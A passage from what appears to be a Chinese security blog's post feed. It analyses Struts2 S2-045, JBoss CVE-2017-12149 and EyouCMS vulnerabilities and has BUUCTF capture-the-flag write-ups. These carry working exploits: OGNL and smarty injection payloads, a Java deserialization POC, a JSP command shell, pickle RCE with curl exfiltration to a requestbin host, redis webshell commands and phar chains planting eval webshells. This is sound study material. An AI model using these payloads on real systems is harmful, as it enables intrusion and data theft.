1_multipart&#x2F;form-data%&#123;(#o&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#o):((#c&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#g&#x3D;#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest()).(#f&#x3D;new java.io.File(#req.getRealPath(&#39;&#x2F;&#39;),#req.getParameter(&#39;f&#39;))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))&#125; 访问x.jsp 原理分析 v2.3.32：https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a 根据diff版本更新前后分析 我的maven包是2.3.30，大同小异 org/apache/struts/struts2-core/2.3.30/struts2-core-2.3.30.jar!/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.class 根据方法名可以看出是生成错误消息，跟进LocalizedTextUtil类的findText() 可以看到，对findText()方法进行了重载，先调用上面的findText()，再调用下面的findText() 具体跟进findText()中的getDefaultMessage() 跟进TextParseUtil.translateVariables() 这里存在递归调用，跟进 跟进parse.evaluate() 跟进实现这个接口的类 执行了ognl表达式 最后再回去分析如何跳到buildErrorMessage() 在 struts2 的框架当中，内置了许多的拦截器，主要用于对框架的功能扩展，此次漏洞的FileUploadInterceptor 就是对框架文件上传的功能扩展，这里就是处理无效的Content-Type 1org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn&#39;t contain a multipart&#x2F;form-data or multipart&#x2F;mixed stream, content type header is %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data 漏洞修复 升级至Struts2安全版本 使用Servlet过滤器验证Content-Type过滤不匹配的请求multipart/form-data 参考链接 http://www.polaris-lab.com/index.php/archives/45/ https://paper.seebug.org/247/#0x01","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞-CVE-2017-12149-JBoss","slug":"Java反序列化漏洞-CVE-2017-12149-JBoss","date":"2020-04-13T06:20:10.000Z","updated":"2020-04-14T01:19:56.382Z","comments":true,"path":"2020/04/13/Java反序列化漏洞-CVE-2017-12149-JBoss/","link":"","permalink":"https://glotozz.github.io/2020/04/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149-JBoss/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 漏洞修复 总结 之前分析过 ysoserial中CommonsCollections5这条链，而互联网爆出JBOSS反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，可以利用那条链。 环境搭建漏洞影响5.x和6.x版本的JBOSSAS。 这里搭建的环境为JBoss AS 6.1.0.Final 漏洞分析server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class doFilter()方法 直接从http中获取数据，并直接调用readObject()进行反序列化 用之前写过的POC打一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // val是私有变量，所以利用下面方法进行赋值 Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); &#125;&#125; 漏洞修复 升级新版本。 删除http-invoker.sar 组件。 添加如下代码至 http-invoker.sar 下 web.xml的security-constraint 标签中： &lt;url-pattern&gt;/*&lt;/url-pattern&gt;用于对 http invoker 组件进行访问控制。 总结对于Jboss，Tomcat，Struts2，Weblogic等等， 这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器。而通常这些架构都设置了过滤器，会对请求进行过滤处理，因此如果漏洞出现在Filter层面，触发的条件也变得简单，危害较大。","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"eyoucms历史漏洞分析","slug":"eyoucms历史漏洞分析","date":"2020-04-03T15:28:12.000Z","updated":"2020-04-04T11:39:50.153Z","comments":true,"path":"2020/04/03/eyoucms历史漏洞分析/","link":"","permalink":"https://glotozz.github.io/2020/04/03/eyoucms%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 Eyoucms_v1.0，存在前台getshell EyouCMS &lt;1.4.2 任意代码执行漏洞 参考链接 打算找个cms漏洞挖掘，找到了Eyoucms，打算先分析历史漏洞，再对最新版本进行挖掘。 环境搭建 EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统 。 https://www.eyoucms.com/ Eyoucms_v1.0，存在前台getshellv_1.1.3也存在 application/api/controller/Uploadify.php preview()方法，提供图片预览功能 根据正则提取数据，简单分析就可以构造payload 1data:image&#x2F;php;base64,PD9waHAgcGhwaW5mbygpOz8+ 注意这里的路径 EyouCMS &lt;1.4.2 任意代码执行漏洞 application/api/controller/Ajax.php 绕过IS_AJAX_POST 在包中加上X-Requested-With: XMLHttpRequest 这里可以模板注入，渲染的模板为 1&#123;eyou:memberlist $key&#x3D;&#39;$val&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125; 经过尝试，$key=&#39;$val&#39;可以成功注入 1&#123;eyou:memberlist &#125;&#x3D;&#39;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&#39; js&#x3D;&#39;on&#39;&#125;$htmlcode&#123;&#x2F;eyou:memberlist&#125; =&gt; 1&#123;&quot;&#125;&quot;: &quot;&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;&quot;&#125; =&gt; 1eyJ9IjogIntwaHB9cGhwaW5mbygpO3svcGhwfSJ9 参考链接 https://www.cnblogs.com/r00tuser/p/9405870.html http://www.lovei.org/archives/EyouCMS-SSTI.html","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"buuctf-wp","slug":"buuctf-wp","date":"2020-04-02T13:32:32.000Z","updated":"2020-04-24T07:36:21.445Z","comments":true,"path":"2020/04/02/buuctf-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/02/buuctf-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 [SCTF2019]Flag Shop [CISCN2019 华东南赛区]Double Secret [RCTF2019]calcalcalc [WUSTCTF2020]Train Yourself To Be Godly [WUSTCTF2020]easyweb [Zer0pts2020]phpNantokaAdm [Zer0pts2020]musicblog [Zer0pts2020]Can you guess it? [Zer0pts2020]urlapp [Zer0pts2020]notepad [D3CTF 2019]EasyWeb [D3CTF 2019]EzUpload [D3CTF 2019]Showhub LFI2019 [SUCTF 2018]annonymous [SUCTF 2018]GetShell [SUCTF 2018]MultiSQL [SUCTF 2018]Homework [CISCN2019 华东南赛区]Web4 [GWCTF 2019]你的名字 [CSAWQual 2019]Web_Unagi [N1CTF 2018]eating_cms [BSidesCF 2019]SVGMagic [HITCON 2015]Babyfirst 玩狼人杀输一把刷3道buu哈哈 #############04/02 [SCTF2019]Flag Shop/filebak得到源码 jwt身份验证， 先爆破一下密钥试试 1.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJiNjI2YjUyZi05OWYxLTQ1M2YtYjBhYy1iYzg3MTA3NjgwYzIiLCJqa2wiOjIwfQ.oKTH78tthnezEs9RXq5MQPiUIhiLrnUVtONe2yalk_I 果然不行， 根据源码需要用足够的jkl才能购买flag 这里的考点是erb模版注入读取secret 但是限制了用户输入为7位，但是模版渲染需要&lt;%==&gt;标志，也就是利用两个字符模版注入 方法一key爆破 12$&#96; 匹配文本之前的文本$&#39; 匹配文本之后的文本 利用预定义字符$绕过第一个if判断并读取secret 123&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working&#x3D;&gt;&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working 得到key 再将jkl伪造成1e27，修改cookie购买flag，返回的jwt解码中存入了flag 方法二HTTP参数传递类型差异攻击 https://xz.aliyun.com/t/6686 举个例子 12345678$a &#x3D; &quot;qwertyu&quot;$b &#x3D; Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]puts &quot;$a: #&#123;$a[0,3]&#125;&quot;puts &quot;$b: #&#123;$b[0,3]&#125;&quot;&#x2F;&#x2F;result$a: qwe$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;] 读取文件 123&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6&#x3D;&gt;&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 如果是命令执行没有回显 1&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6 [CISCN2019 华东南赛区]Double Secret提示secret，访问/secret 提示传参secret，传参?secret=aaaaa，大于四位时报错 查看源码 明显的ssti，并且这里使用了自定义的RC4加密，具体需要查看rc4_Modified.py文件，这里用%ff可以触发报错 搜索一下找到了类似的源码 https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage 那么构造exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# coding=utf-8import urllibimport requestsclass RC4: def __init__(self, public_key=None): if not public_key: public_key = 'none_public_key' self.public_key = public_key self.index_i = 0 self.index_j = 0 self._init_box() def _init_box(self): \"\"\" 初始化 置换盒 \"\"\" self.Box = [i for i in range(256)] key_length = len(self.public_key) j = 0 for i in range(256): index = ord(self.public_key[(i % key_length)]) j = (j + self.Box[i] + index) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def do_crypt(self, string): \"\"\" 加密/解密 string : 待加/解密的字符串 \"\"\" out = [] for s in string: self.index_i = (self.index_i + 1) % 256 self.index_j = (self.index_j + self.Box[self.index_i]) % 256 self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j], self.Box[self.index_i] r = (self.Box[self.index_i] + self.Box[self.index_j]) % 256 R = self.Box[r] # 生成伪随机数 out.append(chr(ord(s) ^ R)) return ''.join(out)a = RC4('HereIsTreasure')payload = \"&#123;&#123; config &#125;&#125;\"payload = \"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;\"print(urllib.parse.quote(a.do_crypt(payload))) RC4，加密和解密是一样的再加密一次就等于解密 1.%14%19V%A5%09%0Dgl%DD%C5%0E 发现不行， 提示ValueError: chr() arg not in range(256) 和一些其他脚本对比分析，初始化置换盒中的代码有点问题 self.Box = range(256)应该转化为self.Box = [i for i in range(256)] 并且需要使用python3的url编码。 命令执行但是无回显，这里为了方便就简单读取/flag.txt [RCTF2019]calcalcalc使用了拟态的构想，就是将用户输入的参数分别进入三种后端（php,python,nodejs），如果返回值不同则认定无效。 给了三种语言的源码 app.py 123456789101112131415161718192021from flask import Flask, requestimport bsonimport jsonimport datetimeapp = Flask(__name__)@app.route(\"/\", methods=[\"POST\"])def calculate(): data = request.get_data() expr = bson.BSON(data).decode() if 'exec' in dir(__builtins__): del __builtins__.exec return bson.BSON.encode(&#123; \"ret\": str(eval(str(expr['expression']))) &#125;)if __name__ == \"__main__\": app.run(\"0.0.0.0\", 80) index.php 123456&lt;?phpob_start();$input = file_get_contents('php://input');$options = MongoDB\\BSON\\toPHP($input);$ret = eval('return ' . (string) $options-&gt;expression . ';');echo MongoDB\\BSON\\fromPHP(['ret' =&gt; (string) $ret]); index.js 1234567891011121314151617... (function () &#123; const Module = require('module') const _require = Module.prototype.require Module.prototype.require = (arg) =&gt; &#123; if (['os', 'child_process', 'vm', 'cluster'].includes(arg)) &#123; return null &#125; return _require.call(_require, arg) &#125; &#125;)() process.on('message', msg =&gt; &#123; const ret = eval(msg) process.send(ret) process.exit(0) &#125;) 都过滤了各自的一些危险库，其中php设置了disable_function 三种服务都在内网中，因此无法外带，可以考虑基于时间延时的RCE，参考Time_Based_RCE 原理类似sql盲注，因为前端会等待后端全部响应完成才继续执行网页 python 可以调用time.sleep(5)产生延时或者set(1 for i in range(10000000)) 其中第二种的延时较小，数值过大会内存错误 要在三种语言中既能造成延时又不crash，很难找到一个通用的表达式，思路可以找找注释符。 //在php和nodejs中表示注释，在python中表示整数除法 大致思路如下 11&#x2F;&#x2F;1 and not (ord(open(&#39;&#x2F;flag&#39;).read()[0])&#x3D;&#x3D;1) and __import__(&#39;time&#39;).sleep(5) 再看看前端的限制 可以通过json传一个isVip为true绕过，而正则可以通过chr()+拼接字符串的方式绕过 然而并没有延时明显延时 再分析CTFTime上给的脚本，另一种思路：使用eval()来达到通用的效果 1eval(__import__(&#39;time&#39;).sleep(5) if ord(open(&#39;&#x2F;flag&#39;).read()[3])&gt;&#x3D;64 else 1) 测试成功 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsfrom time import timeurl = 'http://39b0719c-b348-4b9c-af1f-8f62ab554bf7.node3.buuoj.cn/calculate'def encode(payload): print('eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))) return 'eval(%s)' % ('+'.join('chr(%d)' % ord(c) for c in payload))def query(bool_expr): payload = \"__import__('time').sleep(5) if %s else 1\" % bool_expr t = time() r = requests.post(url, json=&#123;'isVip': True, 'expression': encode(payload)&#125;) # print(r.text) delta = time() - t print(payload, delta) return delta &gt; 5def binary_search(geq_expression, l, r): eq_expression = geq_expression.replace('&gt;=', '==') while True: if (r - l) &lt; 4: for mid in range(l, r + 1): if query(eq_expression.format(num=mid)): return mid else: print('NOT FOUND') return mid = (l + r) // 2 if query(geq_expression.format(num=mid)): l = mid else: r = mid# flag_len = binary_search(\"len(open('/flag').read())&gt;=&#123;num&#125;\", 0, 100)flag_len = 50print('flag length: %d' % flag_len)flag = 'flag&#123;cef388f4-71a6-41d9-b0c1-3dcd5e3'while len(flag) &lt; flag_len: c = binary_search(\"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;\" % len(flag), 0, 128) if c: # the bs may fail due to network issues flag += chr(c) print(flag) [WUSTCTF2020]Train Yourself To Be Godly 打开页面是tomcat，影响较大的有三个历史漏洞，这里考的是弱口令 &amp;&amp; 后台getshell漏洞 利用 ..;/可以穿越目录，从而返回上一层，/..;/manager/html进入管理页面，弱密码tomcat:tomcat登录后台，但是直接上传war包由于路径问题导致上传失败。 我们当前目录为examples，少了一个目录穿越/..;/，加上之后返回401，加上基础认证，返回403，即权限不够 查看basic认证的返回包 发现有一个Path=/manager， 方法一 官方wp是直接将传wp时的/examples修改为/manager，这样cookie的Path就对应了 加上basic认证，出现403，然后替换新的setCookie值也还是403，遂作罢 方法二 和Mrkaixin师傅讨论了下，修改响应包使Path=/..;/manger 或者可以直接F12修改Cookie 传war包 冰蝎 [WUSTCTF2020]easyweb上传文件之后存在下载操作，任意文件读取漏洞 1&#x2F;download?file&#x3D;3e6916d2-645a-4d6a-8adf-9eff8ad74d89.jpeg 中间还报错得到了路径 1&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;uploads&#x2F;null (No such file or directory) /uploads目录无法直接访问，但是可以配合幽灵猫漏洞文件包含 https://github.com/00theway/Ghostcat-CNVD-2020-10487 写个1.jsp 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% out.println(\"Executing command\");Process p = Runtime.getRuntime().exec(\"ls /\");OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;%&gt; 能成功执行命令，但是回显有点奇怪，反弹shell也失败，jsp不能使用``包裹命令直接带出，最后用@Mrkaixin的木马反弹shell成功 ###################04/10 [Zer0pts2020]phpNantokaAdm给了源码 index.php sqlite数据库，存在明显的sql注入，跟进is_vaild() 构造形式 1CREATE TABLE $table (dummy1 TEXT,dummy2 TEXT,&#96;$column&#96; $type); =&gt; 本地测试可以利用phpliteadmin 在执行sql语句前出现了其他查询 123$pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');$pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES (\"' . FLAG . '\");');$pdo-&gt;query($sql); 1、在创建表时可以用as来复制另一个表中的数据。这里我们就可以用as select sql from sqlite_master来复制sqlite_master的sql字段。 2、 双引号被过滤了，在sqlite中可以用中括号[]来代替。 3、使用as+表别名是指在一个特定的 SQLite 语句中重命名表。重命名是临时的改变，在数据库中实际的表的名称不会改变。 列别名用来为某个特定的 SQLite 语句重命名表中的列。 和其他数据库类似，别名的关键字as可以被省略 构造如下 1CREATE TABLE a as select sql as[ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2); =&gt; 1table_name&#x3D;a as select sql as[&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2 第二次查询 1table_name&#x3D;a as select flag_2a2d04c3 as[&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2 [Zer0pts2020]musicblog查看源码，发现flag在worker.js中设置在浏览器UA中 admin会自动点击#like标签 观察插入content的地方 而这个strip_tags()存在bug strip_tags site:bugs.php.net https://bugs.php.net/bug.php?id=78814 &lt;audio&gt;标签受CSP限制，这里可以利用bug构造一个&lt;a&gt;标签绕过CSP的限制 构造&lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa 自己测试下成功跳转，然后等待admin点击即可 [Zer0pts2020]Can you guess it?源码 $_SERVER[&#39;PHP_SELF&#39;]表示当前执行脚本的文件名， 构造/index.php/config.php?source 但是这里正则匹配/config\\.php\\/*$/i 匹配形式如config.php///的字符串 搜索basename()的bug basename site:bugs.php.net https://bugs.php.net/bug.php?id=62119 basename()会丢弃文件名中非ASCII字符。 加在结尾，可以成功绕过正则/index.php/config.php/%ff?source [Zer0pts2020]urlapp https://www.anquanke.com/post/id/200927 url缩短，用redis存储 查看redis配置文件 禁用了一些指令 处理过程 如果是POST请求，对传入的url进行正则检测，调用set()函数 相当于发送redis命令，这里存在CRLF注入，直接操作redis。 比如常见的些shell或者定时任务 12345flushallconfig set dir &#x2F;var&#x2F;wwwconfig set dbfilename shell.phpset webshell &quot;&lt;?php phpinfo();?&gt;&quot;save 但是常用的redis执行被禁用，比如CONFIG 参考wp，这里找到了BITOP命令，可以对key做位运算，并把结果保存到新key里。 https://redis.io/commands/bitop 构造16位符合条件的文件名 12SET tmp 1BITOP XOR abababababababab flag tmp 即写入abababababababab中 一开始q访问出现404 这里的思路是利用setbit把某一位变成? 或者/ 1和f异或得到W 12W&#x3D;&gt;01010111?&#x3D;&gt;00111111 使用setbit讲W转化为? 12345SET tmp 1BITOP XOR abababababababab flag tmpsetbit abababababababab 1 0setbit abababababababab 2 1setbit abababababababab 4 1 [Zer0pts2020]notepadflask框架 处理404页面存在明显的模板注入 跟进valid_url() 长度限制为16，理论上只能读取一些配置常量 利用ssti读取config中的secret_key，配合flask的session伪造 ssti 得到&#39;SECRET_KEY&#39;: b&#39;\\xcb\\xcf\\x89\\x82\\x9e\\xfed\\x82\\xcck\\x98\\xa8\\xaf\\x956\\xf8&#39; pickle反序列化RCE 123456789import _pickle as cPickleimport sysimport base64COMMAND &#x3D; sys.argv[1]class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,))print base64.b64encode(base64.b64encode(cPickle.dumps(PickleRce()))) 注意这里要base64编码两次 =&gt; 12[root@glotozz ~]# python3 1.py &quot;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;rswxb2rs?a&#x3D;\\&#96;cat flag.txt |base64\\&#96;&quot;b&#39;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&#39; flask的session伪造 原始数据 1b&#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOZGNRQjljUUVvV0FRQUFBQmtZWFJsY1FKWUV3QUFBREl3TWpBdE1EUXRNVEFnTVRFNk5USTZNak54QTFnRUFBQUFkR1Y0ZEhFRVdBQUFBQUJ4QlZnRkFBQUFkR2wwYkdWeEJsZ0tBQUFBS2s1bGR5Qk9iM1JsS25FSGRXRXU&#x3D;&quot;&#125;&#125;&#39; 伪造 1python3 flask_session_cookie_manager3.py encode -t &#39;&#123;&quot;savedata&quot;:&#123;&quot; b&quot;:&quot;Z0FOamNHOXphWGdLYzNsemRHVnRDbkVBV0VZQUFBQmpkWEpzSUdoMGRIQTZMeTlvZEhSd0xuSmxjWFZsYzNSaWFXNHVZblYxYjJvdVkyNHZjbk4zZUdJeWNuTS9ZVDFnWTJGMElHWnNZV2N1ZEhoMElIeGlZWE5sTmpSZ2NRR0ZjUUpTY1FNdQ&#x3D;&#x3D;&quot;&#125;&#125;&#39; -s &#39;\\xcb\\xcf\\x89\\x82\\x9e\\xfed\\x82\\xcck\\x98\\xa8\\xaf\\x956\\xf8&#39; 没成功，思路应该差不多，有空再看（咕 [D3CTF 2019]EasyWeb基于codeigniter框架 application/controllers/User.php 跟进get_view() 这里的方法调用顺序存在明显的逻辑错误可以二次sql注入，再配合smarty模板注入 username处可以时间盲注爆库，但是最后发现flag不在数据库中 templates/index/koocola.tpl中提示 123Hi, &#123;&#123;$username.username&#125;&#125;, hope you have a good experience in this ctf game&lt;br&gt;you must get a RCE Bug in this challenge 联合注入+smarty模板注入 根据例子注意这里需要两对{}来渲染 123&#123;&#123;$smarty.version&#125;&#125;&#x3D;&gt;g&#39;un&#123;ion se&#123;lect 0x7B7B24736D617274792E76657273696F6E7D7D# 3.1.33版本，可以使用内置函数{php}实现RCE 123&#123;&#123;php&#125;&#125;eval($_GET[cmd]);&#123;&#123;&#x2F;php&#125;&#125;&#x3D;&gt;g&#39; u&#123;nion s&#123;elect 0x7b7b7068707d7d6576616c28245f4745545b636d645d293b7b7b2f7068707d7d# 如果{php}被弃用，因为这里存在文件上传，还可以尝试配合{include}去RCE #######################04/11 [D3CTF 2019]EzUpload给了源码 __construct()中新建了目录 三个check方法 经过check后文件写入。文件内容从传入的url读取，一般情况下是允许读取远程文件的，因此可以在vps上设置文件。 checkdir()检查了$this-&gt;userdir，先放着 checkurl()禁止了url出现php|file，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用data://协议 checkext()禁止了filename出现..、/、ph，可以想到.htaccess 在upload()中还对文件内容进行了过滤， 下面两种常用的无法使用 12AddType application&#x2F;x-httpd-php .jpgphp_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot; 可以使用 1AddHandler php7-script .txt 尝试写入.htaccess 1action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess .htaccess写入成功，但__destruct()中的file_put_contents()写入失败 排查下是路径的问题，在__destruct()中加一个var_dump(system(&#39;pwd&#39;)); 得到__destruct()的默认目录是/，因此没有写入权限。上面我们虽然成功写入了.htaccess，但是仍然无法写入php格式的文件，除非绕过upload()中的过滤。 可以利用phar反序列化自动触发__destruct()中的file_put_contents()，并且phar可以进行gzip压缩，从而绕过对一些字符的检查。 第一步，寻找phar反序列化触发点，可以通过upload()方法中的 $content = file_get_contents($this-&gt;url,NULL,NULL,0,2048); 第二步，获取upload/目录的绝对路径，可以通过__destruct()中的 echo $string; 触发__toString()，打印__DIR__ 先获取绝对路径 12345678910111213141516171819&lt;?php class dir&#123; public $userdir; public function __construct() &#123; $this-&gt;userdir = '../'; &#125; &#125; $a = new dir(); $a -&gt; userdir = new dir(); // var_dump($a); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 重命名为1，进行gzip压缩并放到vps上 1action&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;174.1.244.41&#x2F;1.gz&amp;filename&#x3D;gqyy.phar.gz 绝对路径为/var/www/html/6c19fec38725c11d/upload/76d9f00467e5ee6abc3ca60892ef304e 写入php格式的txt文件 1234567891011121314151617181920&lt;?php class dir&#123; public $userdir; public $filename; public function __construct() &#123; $this-&gt;filename = '/var/www/html/52aee03d2e0f909e/upload/76d9f00467e5ee6abc3ca60892ef304e/gqy';//这里不需要加后缀 $this-&gt;userdir = 'aa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'; &#125; &#125; $a = new dir(); // var_dump($a); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 